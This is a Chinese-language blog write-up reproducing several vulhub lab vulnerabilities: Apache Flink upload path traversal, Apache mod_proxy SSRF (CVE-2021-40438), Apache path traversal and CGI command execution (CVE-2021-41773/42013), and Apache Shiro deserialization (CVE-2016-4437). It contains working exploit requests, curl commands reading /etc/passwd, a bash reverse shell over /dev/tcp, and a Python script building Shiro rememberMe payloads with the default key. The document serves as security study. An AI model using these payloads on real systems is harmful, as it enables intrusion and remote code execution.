+<p>1.5.1&lt;&#x3D;Apache Flink&lt;&#x3D;1.11.2</p>
+<h3 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h3><img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/17518%E7%A0%B4%E8%A7%A3.png" class>
+
+<p>访问目标机的8081端口，从面板可以看到Apache flink版本为1.11.2，符合漏洞要求</p>
+<p>利用方法就是发送一个post的包，模板如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /jars/upload HTTP/1.1</span><br><span class="line">Host: 靶机ip:端口</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Length: 187</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Disposition: form-data; name=&quot;jarfile&quot;; filename=&quot;写入文件的绝对路径&quot;</span><br><span class="line"></span><br><span class="line">你想写入的内容</span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y--</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /jars/upload HTTP/1.1</span><br><span class="line">Host: 192.168.10.129:8081</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Length: 187</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Disposition: form-data; name=&quot;jarfile&quot;; filename=&quot;../../../../../../tmp/liberator&quot;</span><br><span class="line"></span><br><span class="line">liberator</span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y--</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/17518%E7%A0%B4%E8%A7%A32.png" class>
+
+<p>可以看到写入成功，老样子，我们还是连接镜像内部的shell，来检验文件是否写入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -i e1ceeb97b6f9 /bin/bash</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/17518%E7%A0%B4%E8%A7%A33.png" class>
+
+<p>可以看到文件写入成功</p>
+<h2 id="CVE-2021-40438（Apache-server-mod-proxy的SSRF漏洞）"><a href="#CVE-2021-40438（Apache-server-mod-proxy的SSRF漏洞）" class="headerlink" title="CVE-2021-40438（Apache server mod_proxy的SSRF漏洞）"></a>CVE-2021-40438（Apache server mod_proxy的SSRF漏洞）</h2><p>apache的服务就不说了,天天用.其中mod_proxy模块是用于反向代理的模块，它允许将客户端请求代理到另一个服务器上。反向代理的概念是客户端将请求发送给一个服务器，但实际上请求会被代理服务器转发到另一个目标服务器上，然后将目标服务器的响应返回给客户端。 使用mod_proxy模块时，需要在Apache的配置文件中进行相应的配置。以下是一个简单的示例配置：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apacheCopy codeLoadModule proxy_module modules/mod_proxy.so</span><br><span class="line">LoadModule proxy_http_module modules/mod_proxy_http.so</span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerName example.com</span><br><span class="line"></span><br><span class="line">    ProxyPass / http://backend-server/</span><br><span class="line">    ProxyPassReverse / http://backend-server/</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上述配置中，ProxyPass将所有对example.com的请求代理到backend-server上，并且ProxyPassReverse用于修改响应中的Location头，确保响应正确返回给客户端。 mod_proxy模块存在一处逻辑错误导致攻击者可以控制反向代理服务器的地址，进而导致SSRF漏洞。 </p>
+<p>漏洞利用条件为apache v2.4.48 及以下版本 漏洞复现</p>
+<h3 id="复现-4"><a href="#复现-4" class="headerlink" title="复现"></a>复现</h3><p>先访问一下服务,docker ps可以看到服务开在了8080端口.这里访问可以看到一个Apache Tomcat的示例页面，此时Apache HTTP Server是以中间反代服务器的身份，运行在客户端（用户）和后端服务器（Tomcat）之间，Apache和Tomcat通过AJP协议进行通信。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AJP（Apache JServ Protocol）协议是一种用于连接Web服务器（如Apache HTTP Server）与Java应用服务器（如</span><br><span class="line">Tomcat）之间的协议。它被设计用于在Web服务器和应用服务器之间进行高效的通信，以便将HTTP请求从Web服务器传递到应用</span><br><span class="line">服务器，并将应用服务器生成的响应传递回Web服务器，最终返回给客户端。</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/40438%E7%A0%B4%E8%A7%A3.png" class>
+
+<p>使用发包就可以达到目的，发包示例如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://www.baidu.com/ HTTP/1.1</span><br><span class="line">Host: 192.168.10.129:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/40438%E7%A0%B4%E8%A7%A32.png" class>
+
+<p>可以看到成功出现302跳转</p>
+<h2 id="CVE-2021-41773（Apache-HTTP-Server路径穿越漏洞）"><a href="#CVE-2021-41773（Apache-HTTP-Server路径穿越漏洞）" class="headerlink" title="CVE-2021-41773（Apache HTTP Server路径穿越漏洞）"></a>CVE-2021-41773（Apache HTTP Server路径穿越漏洞）</h2><p>在其2.4.49版本中，引入了一个路径穿越漏洞,这个漏洞有两种利用方式,在严格情况下可以实现任意文件读取(一般web服务器也不是拿root运行的,就只能读非root文件了),如果开启了cgi或cgid,可以实现rce </p>
+<p>在 Apache HTTP Server 中，CGI（Common Gateway Interface）和 CGID（CGI Daemon）是用于处理动态内容的机制。它们允许 Web 服务器与外部程序（通常是脚本或可执行文件）进行交互，生成动态的 Web 页面内容。CGI 机制允许将用户的请求传递给一个外部脚本或程序，然后将该程序的输出作为响应返回给客户端。 </p>
+<p>要使用 CGI 或 CGID，你需要编写一个符合 CGI 协议的程序或脚本，该程序会接收请求参数，处理请求并生成响应。然后，你需要在 Apache HTTP Server 的配置中启用 CGI 或 CGID 模块，并将请求映射到你编写的 CGI 程序或脚本。 在 Apache 的配置文件中，使用类似以下的配置来启用 CGI 模块并将请求映射到某个目录下的 CGI 脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apacheCopy codeLoadModule cgi_module modules/mod_cgi.so</span><br><span class="line"></span><br><span class="line">&lt;Directory &quot;/path/to/cgi/scripts&quot;&gt;</span><br><span class="line">    Options +ExecCGI</span><br><span class="line">    AddHandler cgi-script .cgi .pl</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在这个示例中，LoadModule行启用了 CGI 模块， 部分指定了 CGI 脚本所在的目录，并通过 Options +ExecCGI和AddHandler 配置来告诉 Apache 如何处理 CGI 脚本。 然后，你可以在指定的目录下编写 CGI 脚本（如 Perl、Python 等脚本），当客户端请求访问这些脚本时，Apache 会将请求传递给相应的 CGI 程序，然后将生成的响应返回给客户端。 这个漏洞的利用条件是版本等于2.4.49,如果需要打rce,则需要穿越的目录允许被访问，比如配置了Require all granted（默认情况下是不允许的）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在Apache HTTP Server（通常称为Apache）的配置中，Require all granted 是一个用于控制访问权限的配置指令。它用</span><br><span class="line">于声明对特定资源或路径的访问是允许的，即所有请求都被授予访问权限。</span><br><span class="line"></span><br><span class="line">具体来说，Require all granted 是在Apache的访问控制配置块（例如 &lt;Directory&gt; 或 &lt;Location&gt; 块）中使用的，用</span><br><span class="line">于指定所有用户都被授予对该目录或位置的访问权限。这意味着任何用户都可以访问这个目录或位置的内容，而不受进一步的</span><br><span class="line">访问控制限制。</span><br></pre></td></tr></table></figure>
+
+<h3 id="复现-5"><a href="#复现-5" class="headerlink" title="复现"></a>复现</h3><p>这个环境就遇到一定的问题，我们直接在windows浏览器里访问不了</p>
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/41773%E7%A0%B4%E8%A7%A3.png" class>
+
+<p>我们回到虚拟机ping一下主机</p>
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/41773%E7%A0%B4%E8%A7%A32.png" class>
+
+<p>发现是可以ping通的</p>
+<p>那我们尝试用nmap扫一下存活端口</p>
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/41773%E7%A0%B4%E8%A7%A33.png" class>
+
+<p>8080整了一个filtered，给拦截了</p>
+<p>这里不想进容器改了，直接上poc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -v --path-as-is http://靶机IP和端口/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line">curl -v --data &quot;echo;你要执行的命令&quot; &#x27;http://靶机IP和端口/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="CVE-2021-42013（Apache-HTTP-Server路径穿越漏洞）"><a href="#CVE-2021-42013（Apache-HTTP-Server路径穿越漏洞）" class="headerlink" title="CVE-2021-42013（Apache HTTP Server路径穿越漏洞）"></a>CVE-2021-42013（Apache HTTP Server路径穿越漏洞）</h2><p>Apache官方在2.4.50版本中对2.4.49版本中出现的目录穿越漏洞CVE-2021-41773进行了修复，但这个修复并不完整</p>
+<p>攻击者依旧可以读取Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，也可以在开启了cgi或者cgid的服务器上执行任意命令</p>
+<p>漏洞利用条件是Apache HTTP Server2.4.49以及2.4.50两个版本</p>
+<h3 id="复现-6"><a href="#复现-6" class="headerlink" title="复现"></a>复现</h3><img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/42013%E7%A0%B4%E8%A7%A3.png" class>
+
+<p>可以看到这下子成功开启了页面服务</p>
+<p>既然和41773这个CVE类似，我们就尝试一下41773的poc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -v --path-as-is http://192.168.10.129:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/42013%E7%A0%B4%E8%A7%A32.png" class>
+
+<p>发现失败了，但是我们上面说过42013对漏洞的修复并不完整，我们将%2e再次进行编码（%%32%65）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -v --path-as-is http://192.168.10.129:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/</span><br><span class="line">.%%32%65/.%%32%65/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/42013%E7%A0%B4%E8%A7%A33.png" class>
+
+<p>可以看到读取成功，但是除了读取，还可以尝试进行rce，这里就不试41773的poc了，直接使用二次编码的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -v --data &quot;echo;ls&quot; &#x27;http://192.168.10.129:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#x27;</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/42013%E7%A0%B4%E8%A7%A34.png" class>
+
+<p>可以看到命令执行成功</p>
+<p>那我们尝试一下反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br><span class="line">curl -v --data &quot;echo;bash -i &gt;&amp; /dev/tcp/192.168.10.129/8888 0&gt;&amp;1&quot; &#x27;http://192.168.1.103:8080/cgi-</span><br><span class="line">bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这样子直接反弹失败了，看了教程才想起可以将命令写入文件，然后再执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -v --data &quot;echo;echo &#x27;bash -i &gt;&amp; /dev/tcp/192.168.10.129/8888 0&gt;&amp;1&#x27;&gt;&gt; /tmp/shell.sh&quot; </span><br><span class="line">&#x27;http://192.168.10.129:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65</span><br><span class="line">/.%%32%65/.%%32%65/bin/sh&#x27;</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/42013%E7%A0%B4%E8%A7%A35.png" class>
+
+<p>然后再用cat读取文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -v --data &quot;echo;cat /tmp/shell.sh&quot; &#x27;http://192.168.10.129:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65</span><br><span class="line">/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#x27;</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/42013%E7%A0%B4%E8%A7%A36.png" class>
+
+<p>可以看到文件内容写入成功，下一步就是执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -v --data &quot;echo;bash /tmp/shell.sh&quot; &#x27;http://192.168.10.129:8080/cgi-</span><br><span class="line">bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#x27;</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/42013%E7%A0%B4%E8%A7%A37.png" class>
+
+<p>反弹shell成功，看来以后得试试写入文件执行来反弹shell</p>
+<h2 id="CVE-2016-4437（Apache-shiro反序列化漏洞复现）"><a href="#CVE-2016-4437（Apache-shiro反序列化漏洞复现）" class="headerlink" title="CVE-2016-4437（Apache shiro反序列化漏洞复现）"></a>CVE-2016-4437（Apache shiro反序列化漏洞复现）</h2><p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。它独立于任何容器或框架,所以可以搭配别的组件使用,包括以下功能</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">身份验证（Authentication）：Shiro 可以处理用户身份验证，包括用户名/密码验证、多因素身份验证、记住我功能等。它</span><br><span class="line">支持灵活的身份验证方式，并提供了可插拔的身份验证机制，使开发人员能够适应各种身份验证需求。</span><br><span class="line"></span><br><span class="line">授权（Authorization）：Shiro 具有细粒度的授权机制，允许开发人员定义角色和权限，并在应用程序中对用户进行授权操</span><br><span class="line">作。通过简单的注解或编程方式，开发人员可以轻松地控制用户对资源的访问权限。</span><br><span class="line"></span><br><span class="line">会话管理（Session Management）：Shiro 管理用户会话，包括会话的创建、销毁、过期和检索等。它提供了灵活的会话存</span><br><span class="line">储机制，并支持集中式和分布式环境下的会话管理。</span><br><span class="line"></span><br><span class="line">密码加密（Cryptography）：Shiro 可以帮助开发人员安全地处理用户密码，提供了常用的加密算法和密码哈希功能。这有助</span><br><span class="line">于保护用户密码，并提供额外的安全性。</span><br><span class="line"></span><br><span class="line">Web 支持：Shiro 针对 Web 应用程序提供了特定的支持，包括集成框架（如 Apache Struts 和 Spring MVC）、基于过滤</span><br><span class="line">器的安全控制、Web 会话管理等。这使得在 Web 环境中使用 Shiro 更加方便和高效。</span><br></pre></td></tr></table></figure>
+
+<p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会将用户信息加密，加密过程:用户信息&#x3D;&gt;序列化&#x3D;&gt;AES加密&#x3D;&gt;base64编码&#x3D;&gt;RememberMe Cookie值。如果用户勾选记住密码，那么在请求中会携带cookie，并且将加密信息存放在cookie的rememberMe字段里面，在服务端收到请求对rememberMe值，先base64解码然后AES解密再反序列化，这个加密过程如果我们知道AES加密的密钥，那么我们把用户信息替换成恶意命令，就导致了反序列化RCE漏洞。在shiro版本&lt;&#x3D;1.2.4中使用了默认密钥kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;，这就更容易触发RCE漏洞。</p>
+<p>所以我们payload的产生过程是：</p>
+<p>命令&#x3D;&gt;序列化&#x3D;&gt;AES加密&#x3D;&gt;base64编码&#x3D;&gt;RememberMe Cookie值</p>
+<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>1.未登录的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie里也没有deleteMe字段<br>2.登录失败的话，不管有没有勾选RememberMe字段，返回包都会有 rememberMe&#x3D; deleteMe 字段<br>3.不勾选RememberMe，登录成功的话，返回包set-Cookie里有rememberMe&#x3D;deleteMe字段。但是之后的所有请求中Cookie都不会有RememberMe字段<br>4.勾选RememberMe，登录成功的话，返回包set-Cookie里有rememberMe&#x3D;deleteMe字段，还会有remember 字段，之后的所有请求中Cookie都会有rememberMe字段<br>5.或者可以在cookie后面自己加一个rememberMe&#x3D;1,看返回包有没有rememberMe&#x3D; deleteMe</p>
+<h3 id="复现-7"><a href="#复现-7" class="headerlink" title="复现"></a>复现</h3><img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/4437%E7%A0%B4%E8%A7%A3.png" class>
+
+<h4 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h4><p>这里我们就使用专门针对java反序列化的工具：ysoserial</p>
+<p>先进行下载</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</span><br></pre></td></tr></table></figure>
+
+<p>这里还需要一段生成payload的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"> </span><br><span class="line">def encode_rememberme():</span><br><span class="line">    f = open(&#x27;poc.ser&#x27;,&#x27;rb&#x27;)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(f.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    payload = encode_rememberme()   </span><br><span class="line">    print(&quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode()))</span><br></pre></td></tr></table></figure>
+
+<p>使用ysoserial生成CommonsBeanutils1的Gadget：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-master-SNAPSHOT.jar CommonsBeanutils1 &quot;touch /tmp/liberator&quot; &gt; poc.ser</span><br></pre></td></tr></table></figure>
+
+<p>Gadget 是指在 Java 序列化漏洞利用中使用的特定类或对象。攻击者可以构造特定的序列化数据，通过利用目标应用程序中的反序列化过程中的漏洞，触发 Gadget 的执行从而执行恶意代码。Gadget 通常是由一系列利用链构成的，其中一个 Gadget 可能依赖于另一个 Gadget 的执行结果。Gadget 的目的是利用目标系统中存在的弱点，例如不安全的反序列化实现，最终达到远程代码执行的目的。</p>
+<p>CommonsBeanutils1是Apache Commons Beanutils 库的一个旧版本，其中存在一个已知的 Java 序列化漏洞。该漏洞可以被恶意利用来执行远程代码，可能导致远程代码执行漏洞（Remote Code Execution Vulnerability）</p>
+<p>这个漏洞的本质就是1.2.4及以前版本的shiro的RememberMe功能存在rce可以执行反序列化漏洞,并且这个功能使用了具有反序列化漏洞的CommonsBeanutils1,可以使用CommonsBeanutils1的链子来触发反序列化攻击</p>
+<p>然后再用python脚本生成payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 poc.py</span><br></pre></td></tr></table></figure>
+
+<p>再将生成的payload填入抓到的请求包里就成功写入了</p>
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/4437%E7%A0%B4%E8%A7%A32.png" class>
+
+<h4 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h4><p>使用工具，工具地址：<a href="https://github.com/j1anFen/shiro_attack">https://github.com/j1anFen/shiro_attack</a></p>
